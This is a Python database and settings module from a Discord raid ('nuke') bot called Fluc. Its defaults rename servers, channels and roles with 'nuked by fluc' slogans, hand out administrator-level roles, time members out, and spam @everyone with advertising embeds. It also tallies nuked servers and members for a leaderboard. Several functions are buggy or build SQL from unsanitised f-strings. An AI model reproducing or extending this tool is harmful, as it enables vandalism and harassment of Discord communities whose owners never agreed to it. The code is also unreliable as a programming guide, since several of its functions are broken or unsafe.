# Supress warnings
from __future__ import annotations

__all__ = (
    'Database',
    'User',
    'Stats',
    'Settings'
)

import os
import tarfile
import orjson
import sqlite3

from bots.flucv1_0.hints import *

from io import BytesIO
from copy import deepcopy
from discord import Color, Embed
from colorama import Fore
from logging import getLogger

from discord import (
    Permissions as _Permissions,
    Color as _Color
)

from typing import (
    Optional,
    Dict,
    Tuple,
    List,
    Literal,
    Union,
    Any
)


log = getLogger()



class Database:
    closed: bool
    connection: Optional[sqlite3.Connection]
    cursor: Optional[sqlite3.Cursor]
    user_ids: List[int]
    blacklisted_servers: List[int]
    blacklisted_users: List[int]
    admin_ids: List[int]
    owner_ids: List[int]
    config: Config
    config_path: str

    server_icon = 'https://cdn.discordapp.com/icons/1358429542607229018/1135263cd55cfc4660a8cb52bbd9ad0b.webp?size=1024&width=343&height=343'
    unicode_emojis = [
        f'{ord(emoji):X}'.lower() for emoji in
        [
            '💥',
            '😈',
            '🤡',
            '💩',
            '🖕',
            '💀',
            '🤣',
            '☠',
            '👹',
            '😡',
            '😢',
            '👏',
            '😹',
            '🖤',
            '📢',
            '🤓',
            '☝',
            '😨',
            '😏',
            '🤔'
        ]
    ]
    fonts = [
        '「🤡」𝔫𝔲𝔨𝔢𝔡 𝔟𝔶 𝔣𝔩𝔲𝔠',
        '「💩」𝕥𝕣𝕒𝕤𝕙𝕖𝕕 𝕓𝕪 𝕗𝕝𝕦𝕔',
        '「💀」₩ⱤɆ₵₭ɆĐ ฿Ɏ ₣ⱠɄ₵',
        '「🖕」ɾąìժҽժ ҍվ ƒӀմç',
        '「👹」𐋅𐌀𐌂𐌊𐌄𐌃 𐌁𐌙 𐌅𐌋𐌵𐌂',
        '「👏」ᖴᒪᑌᑕ Oᗯᑎᔕ',
        '「😢」s҉l҉a҉v҉e҉r҉y҉ ҉b҉y҉ ҉f҉l҉u҉c҉',
        '「☠」ρɯɳҽԃ Ⴆყ ϝʅυƈ',
        '「😹」ᶠⁱⁿⁱˢʰᵉᵈ ᵇʸ ᶠˡᵘᶜ',
        '「🤣」f̴l̴u̴c̴s̴ ̴p̴r̴o̴p̴e̴r̴t̴y̴',
        '「💥」o̷b̷l̷i̷t̷e̷r̷a̷t̷e̷d̷ ̷b̷y̷ ̷f̷l̷u̷c̷',
        '「😈」f̲l̲u̲c̲ ̲o̲n̲ ̲t̲o̲p̲',
        '「🖤」j̶o̶i̶n̶ ̶f̶l̶u̶c̶'
    ]

    default_settings: SettingsData = {
        'reasons': ['🤡'],
        'channel': {
            'name': fonts,
            'topic': [],
            'nsfw': [
                False
            ],
            'slowmode_delay': []
        },
        'webhook': {
            'name': [
                'Fluc'
            ]
        },
        'role': {
            'name': fonts,
            'permissions': [
                _Permissions.all().value,
                _Permissions.administrator.flag,
                0
            ],
            'color': [
                _Color.random().value
                for _ in range(50)
            ],
            'hoist': [
                True,
                False
            ],
            'mentionable': [
                True
            ]
        },
        'emoji': {
            'name': [
                'Fluc'
            ],
            'image': [
                server_icon
            ]
        },
        'sticker': {
            'name': [
                'Fluc'
            ],
            'image': [
                server_icon
            ],
            'description': fonts,
            'emoji': [
                '💀',
                '🤣',
                '💥'
            ]
        },
        'member': {
            'nick': fonts,
            'mute': [
                True,
                False
            ],
            'deafen': [
                True,
                False
            ],
            'supress': [
                True,
                False
            ],
            'timed_out_until': [
                60 * 60 * 24 * 24
            ]
        },
        'guild': {
            'name': [
                font[3:] for font in fonts
            ],
            'icon': [
                server_icon
            ]
        },
        'message': {
            'content': [
                '@everyone @here **BEST NUKE BOT? CHOOSE FLUC** discord.gg/yNNUVVzHm2'
            ],
            'tts': [
                True
            ],
            'username': fonts,
            'avatar_url': [      
                f'https://images.emojiterra.com/twitter/v14.0/128px/{code}.png'
                for code in unicode_emojis
            ],
            'embed': [{
                'title': '_*RAID BY FLUC_',
                'description': f'```ansi\n{Fore.RED}YouTube: https://www.youtube.com/@lasnuh\n{Fore.BLUE}Discord: discord.gg/yNNUVVzHm2\n```',
                'color': Color.red().value,
                'image': 'https://media.discordapp.net/attachments/1288587327811358735/1324002009019580516/image.png?ex=67fa6675&is=67f914f5&hm=8cbb87e63acb639ea31cc11c45249cc7b3d4d74ffb2fb962db25481ac8af2325&=&format=webp&quality=lossless&width=698&height=258'
            }]
        }
    }

    def __init__(self) -> None:
        self.closed = True
        self.connection = None
        self.cursor = None
        self.user_ids = []
        self.blacklisted_users = []
        self.blacklisted_servers = []
        self.admin_ids = []
        self.owner_ids = []
        self.config = Config


    def connect(self) -> None:
        path = os.path.join(os.getcwd(), 'data/database.db')
        self.connection = sqlite3.connect(path)
        self.connection.row_factory = sqlite3.Row
        self.cursor = self.connection.cursor()
        log.info('Successfully connected to database!')
        self.closed = False
        self.config_path = os.path.join(os.getcwd(), 'data/config.json')
        self.check()
        self.sync()
        self.connection.commit()
        log.info('Database synced!')


    def close(self) -> None:
        if self.connection:
            self.connection.close()
            log.info('Database closed.')
            self.closed = True


    def check(self) -> None:
        def select(obj: str) -> None:
            self.cursor.execute(f'SELECT name FROM sqlite_master WHERE type="table" AND name="{obj}"')
        
        select('user')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE user(id INTEGER, is_premium INTEGER, server_amount INTEGER, user_amount INTEGER, partners, settings)')
        
        select('stats')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE stats(server_amount INTEGER, user_amount INTEGER)')
        
        select('data')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE data(users, servers)')
        
        select('backup')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE backup(id INTEGER, key, data)')
        
        select('user_blacklist')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE user_blacklist(id INTEGER)')

        select('server_blacklist')
        if self.cursor.fetchone() is None:
            self.execute('CREATE TABLE server_blacklist(id INTEGER)')


    def sync(self) -> None:
        self.config: Config = Config(self.get_config(as_dict=True))
        self.admin_ids = self.config.admin_ids
        self.owner_ids = self.config.owner_ids

        # Do not load everything as there is a possibility of memory overload.
        results = self.execute('SELECT id from user', fetch_all=True)
        for row in results:
            user_id: int = row[0]
            if not user_id in self.user_ids:
                self.user_ids.append(user_id)

        results = self.execute('SELECT id from user_blacklist', fetch_all=True)
        for row in results:
            user_id: int = row[0]
            if not user_id in self.blacklisted_users:
                self.blacklisted_users.append(user_id)

        results = self.execute('SELECT id from server_blacklist', fetch_all=True)
        for row in results:
            server_id: int = row[0]
            if not server_id in self.blacklisted_servers:
                self.blacklisted_servers.append(server_id)
    
    
    def add_user(self, user: User) -> bool:
        if user.id in self.user_ids:
            return False
        
        self.execute(
            'INSERT INTO user(id, is_premium, server_amount, user_amount, partners, settings)'
            'VALUES (?, ?, ?, ?, ?, ?)',
            (user.id, user.is_premium, user.server_amount, user.user_amount, orjson.dumps([]), orjson.dumps(user.settings.raw_data))
        )
        self.user_ids.append(user.id)
        return True
    

    def update_user(self, user: User) -> bool:
        partners = orjson.dumps(user.partners)
        settings = orjson.dumps(user.settings.raw_data)
        self.execute(
            'UPDATE user SET is_premium=?, server_amount=?, user_amount=?, partners=?, settings=? WHERE ID=?',
            (user.is_premium, user.server_amount, user.user_amount, partners, settings, user.id)
        )
        return True


    def delete_user(self, user: User) -> bool:
        if not user.id in self.user_ids:
            return False
        
        self.execute('DELETE FROM user WHERE id=?', (user.id,))
        self.delete_partners(user, *user.partners, ignore_errors=True)
        self.user_ids.remove(user.id)
        return True
    

    def add_partners(self, user: User, *target_ids: int) -> bool:
        partners = self.get_partners(user.id)

        for target_id in target_ids:
            if target_id in partners:
                return False
        
        partners += target_ids 
        partners = orjson.dumps(partners)
        self.execute(
            'UPDATE user SET partners=? WHERE id=?',
            (tuple(partners), user.id)
        )
        return True
    

    def delete_partners(self, user: User, *target_ids: int, ignore_errors: bool = False) -> bool:
        partners = self.get_partners(user.id)

        for target_id in target_ids and ignore_errors is False :
            if not target_id in partners:
                return False
        
            else:
                try:
                    partners.remove(target_id)
                
                except ValueError:
                    pass
        
        else:
            partners = [user_id for user_id in partners if not user_id in target_ids]

        partners = orjson.dumps(partners)
        self.execute(
            'UPDATE user SET partners=? WHERE id=?',
            (tuple(partners), user.id)
        )
        return True
    

    def get_partners(self, user: User) -> List[int]:
        result = self.execute(
            'SELECT partners FROM user WHERE id=?',
            (user.id,)
        )

        if result is None:
            return []
        
        result = orjson.loads(result)
        return [int(user_id) for user_id in result]
    

    def _parse_user(self, user_data: Dict[str, Any]) -> User:
        settings = orjson.loads(user_data['settings'])

        if (
            # Settings corrupted
            not settings.items() <= self.default_settings.items() and
            not int(user_data['id']) in self.owner_ids + self.admin_ids and
            user_data['is_premium'] is False
        ):
            user_data['settings'] = orjson.dumps(self.default_settings)

        user_data['is_blacklisted'] = int(user_data['id']) in self.blacklisted_users
        user = User(user_data)
        return user


    def get_user(self, user_id: int) -> Optional[User]:
        user_data = self.execute(
            'SELECT * FROM user WHERE id=?',
            (user_id,)    
        )

        if user_data is None:
            return None
        
        user = self._parse_user(dict(user_data))
        return user
    

    def get_top(self, order_by: str, *, limit: int = 10, start_from: int = 1) -> Optional[List[User]]:
        user_data = self.execute(f'SELECT id FROM user ORDER BY {order_by} DESC limit {limit} OFFSET {start_from - 1}', fetch_all=True)
        user_data = [dict(row) for row in user_data]
        users: List[User] = []

        if user_data is None:
            return None
        
        for data in user_data:
            user = self.get_user(data['id'])
            if user:
                users.append(user)
        return users


    def get_users(self) -> Tuple[User]:
        users: List[User] = []
        for user_id in self.user_ids:
            user = self.get_user(user_id)
            if user:
                users.append(user)
        return tuple(users)
    

    def get_data(self, item: Literal['users', 'servers'], *, as_list: bool = False) -> Optional[Dict[int, List[int]]]:
        result = self.execute(f'SELECT {item} FROM data')
        items: List[int] = []
        if result is None:
            return None

        parsed: Dict[int, int] = orjson.loads(result[0])
        if as_list:
            for ls in parsed.values():
                for item_id in ls:
                    items.append(item_id)
            return items
        
        else:
            return parsed
    

    def update_data(self, item: Literal['users', 'servers'], user_id: int, patch: Dict[Any, Union[True, None]]) -> bool:
        def update_list(ls: List, patch: Dict[Any, Union[True, None]]):
            for item in patch:
                if patch[item] is None:
                    if item in ls:
                        try:
                            ls.remove(item)
                        
                        except ValueError:
                            # Ignore
                            continue
                
                else:
                    if item not in ls:
                        ls.append(item)

        result = self.get_data(item)
        if result is None:
            return False
        
        data = result.get(str(user_id), [])
        update_list(data, patch)
        result[str(user_id)] = data
        result = orjson.dumps(result)

        self.execute(
            f'UPDATE data SET {item}=?',
            (result, )
        )
        return True
        

    def set_nuke(self, user: User, guild_id: int, members: List[int]) -> bool:
        result = self.get_data('servers', as_list=True)
        server_data = {}
        user_data = {}

        if guild_id in result:
            # The server has already been nuked
            return False
        # Save resources
        del result
        
        server_data[guild_id] = True

        previous = self.get_data('users', as_list=True)
        # Do not log already nuked members
        members = [member for member in members if not member in previous]
        # Set each member in user_data to True
        user_data.update(dict.fromkeys(members, True))
        del previous

        # Update data
        self.update_data('servers', user.id, server_data)
        self.update_data('users', user.id, user_data)

        # Update user stats..
        user.server_amount += 1
        user.user_amount += len(members)
        self.update_user(user)

        # And global stats..
        self.update_stats(1, len(members))
        return True
    

    def create_backup(self, guild_id: int, key: str, data: BackupData) -> bool:
        if self.get_backup(guild_id=guild_id):
            return False
        
        data = orjson.dumps(data)
        self.execute(
            'INSERT INTO backup(id, key, data)'
            'VALUES(?, ?, ?)',
            (guild_id, key, data)
        )
        return True
    

    def delete_backup(self, guild_id: int) -> bool:
        if self.get_backup(guild_id=guild_id) is None:
            return False
        
        self.execute(f'DELETE FROM backup WHERE id={guild_id}')
        return True


    def get_backup(self, *, guild_id: Optional[int] = None, key: Optional[str] = None, get_guild_id: bool = False) -> Optional[BackupData]:
        result: Optional[sqlite3.Row] = None

        if key:
            result = self.execute(
                'SELECT * FROM backup WHERE key=?',
                (key,)
            )

        if guild_id and not result:
            result = self.execute(
                'SELECT * FROM backup WHERE id=?',
                (guild_id,)
            )
        
        if result is None:
            return None
        
        if get_guild_id is True:
            return result['id']
        
        data_key = result['key']
        if key:
            if not data_key == key:
                return

        data = result['data']
        data = orjson.loads(data)
        return data

    
    def blacklist_server(self, server_id: int) -> bool:
        if server_id in self.blacklisted_servers:
            return False
        
        self.execute(
            'INSERT INTO server_blacklist(id) VALUES(?)',
            (server_id,)
        )
        self.blacklisted_servers.append(server_id)
        return True
    

    def remove_blacklist_server(self, server_id: int) -> bool:
        if not server_id in self.blacklisted_servers:
            return False

        self.execute('DELETE FROM user WHERE id=?', (server_id,))
        self.blacklisted_servers.remove(server_id)
        return True
    

    def blacklist_user(self, user_id: int) -> bool:
        if user_id in self.blacklisted_users:
            return False
        
        self.execute(
            'INSERT INTO user_blacklist(id) VALUES(?)',
            (user_id,)
        )
        self.blacklisted_users.append(user_id)
        return True
    

    def remove_blacklist_user(self, user_id: int) -> bool:
        if not user_id in self.blacklisted_users:
            return False
        
        self.execute('DELETE FROM user_blacklist WHERE id=?', (user_id,))
        self.blacklisted_users.remove(user_id)
        return True
    

    def get_stats(self) -> Optional[Stats]:
        result = self.execute('SELECT * FROM stats')

        if result is None:
            return None
        
        stats = Stats(result)
        return stats
    

    def set_stats(self, stats: Stats) -> None:
        self.execute(
            'UPDATE stats SET server_amount=?, user_amount=?',
            (stats.server_amount, stats.user_amount)
        )
        self.sync()

    
    def update_stats(self, server_amount: int, user_amount: int) -> Tuple[int, int]:
        stats = self.get_stats()
        stats.server_amount += server_amount
        stats.user_amount += user_amount
        self.set_stats(stats)


    def add_admin(self, user_id: int) -> bool:
        if user_id in self.admin_ids:
            return False
        
        config = self.config.__dict__
        config.admin_ids.append(user_id)

        with open(self.config_path, 'w', encoding='utf-8') as file:
            file.write(orjson.dumps(config))
        
        self.sync()
        return True


    def remove_admin(self, user_id: int) -> bool:
        if not user_id in self.admin_ids:
            return False
        
        config = self.config.__dict__
        config['admin_ids'] = list(config['admin_ids'])
        config['admin_ids'].remove(user_id)

        with open(self.config_path, 'wb') as file:
            file.write(orjson.dumps(config))
        
        self.sync()
        return True


    def get_config(self, *, as_dict: bool = False) -> Optional[Config]:
        try:
            with open(self.config_path, encoding='utf-8') as file:
                data = orjson.loads(file.read())
                if as_dict:
                    return data
                return Config(data)
        
        except FileNotFoundError:
            return None
        

    def execute(self, command: str, parameters: Optional[Tuple[Any]] = (), *, fetch_all: bool = False) -> Any:
        if self.closed is True:
            log.warning('Database not connected! This may lead to unexpected behavior!')

        self.cursor.execute(command, tuple(parameters))
        self.connection.commit()
        if fetch_all:
            return self.cursor.fetchall()
        return self.cursor.fetchone()
    

    def dump(self) -> BytesIO:
        buffer = BytesIO()
        path = os.path.join(os.getcwd(), 'archive.tar')

        with tarfile.open(path, 'w') as archive:
            archive.add(os.path.join(os.getcwd(), 'data', 'database.db'))

        with open(path, 'rb') as file:
            buffer.write(file.read())
        
        os.remove(path)
        buffer.seek(0)
        return buffer



class Config:
    bot_token: str
    command_prefix: str
    owner_ids: Tuple[int]
    admin_ids: Tuple[int]
    emoji_guild: int

    def __init__(self, data: Dict) -> None:
        self.bot_token = data['bot_token']
        self.command_prefix = data['command_prefix']
        self.owner_ids = tuple(int(owner_id) for owner_id in data['owner_ids'])
        self.admin_ids = tuple(int(admin_id) for admin_id in data['admin_ids'])
        self.emoji_guild = int(data['emoji_guild'])



class User:
    id: int
    is_premium: bool
    is_blacklisted: bool
    server_amount: int
    user_amount: int
    partners: Tuple[int]
    settings: Optional[Settings]
    
    def __init__(self, data: UserData) -> None:
        self.id = int(data['id'])
        self.is_premium = bool(data['is_premium'])
        self.is_blacklisted = bool(data['is_blacklisted'])
        self.user_amount = int(data['user_amount'])
        self.server_amount = int(data['server_amount'])
        self.partners = tuple(orjson.loads(data['partners']))
        self.settings = Settings(dict(orjson.loads(data['settings'])), self)
        if self.is_premium:
            # Remove the default embed from user settings
            self.settings.message['embed'] = []
            self.settings.data['message']['embed'] = []
            self.settings.raw_data['message']['embed'] = []

    @classmethod
    def new_user(cls, user_id: int) -> User:
        self = super().__new__(cls)
        self.id = int(user_id)
        self.is_premium = False
        self.is_blacklisted = False
        self.user_amount = 0
        self.server_amount = 0
        self.partners = ()
        self.settings = Settings(Database.default_settings, self)
        return self
    


class Settings:
    data: SettingsData
    reasons: Optional[List[str]]
    webhook_amount: int
    channel: ChannelDict
    webhook: WebhookDict
    role: RoleDict
    emoji: EmojiDict
    sticker: StickerDict
    member: MemberDict
    guild: GuildDict
    message: MessageDict

    def __init__(self, data: dict[str, str], user: User) -> None:
        self.raw_data: SettingsData = data
        self.data: SettingsData = deepcopy(self.raw_data)
        self.parse_embed()
        
        self.webhook_amount = 46 if user.is_premium else 26
        self.reasons = self.data['reasons']
        self.channel = self.data['channel']
        self.webhook = self.data['webhook']
        self.role = self.data['role']
        self.emoji = self.data['emoji']
        self.sticker = self.data['sticker']
        self.member = self.data['member']
        self.guild = self.data['guild']
        self.message = self.data['message']

    
    def parse_embed(self) -> None:
        embeds: List[EmbedDict] = self.raw_data['message']['embed']

        for i, data in enumerate(embeds):
            embed = Embed(
                title=data['title'],
                description=data['description'],
                color=data['color']
            )

            if 'footer' in data:
                embed.set_footer(
                    text=data['footer']['text'],
                    icon_url=data['footer'].get('icon_url')
                )

            if 'thumbnail' in data:
                embed.set_thumbnail(url=data['thumbnail'])

            if 'author' in data:
                embed.set_author(
                    name=data['author']['name'],
                    url=data['author'].get('url'),
                    icon_url=data['author'].get('icon_url')
                )

            if 'image' in data:
                embed.set_image(url=data['image'])

            if 'fields' in data:
                for field in data['fields']:
                    embed.add_field(
                        name=field['name'],
                        value=field['value'],
                        inline=field['inline']
                    )
            self.data['message']['embed'][i] = embed


class Stats:
    server_amount: int
    user_amount: int

    def __init__(self, data) -> None:
        self.server_amount = int(data['server_amount'])
        self.user_amount = int(data['user_amount'])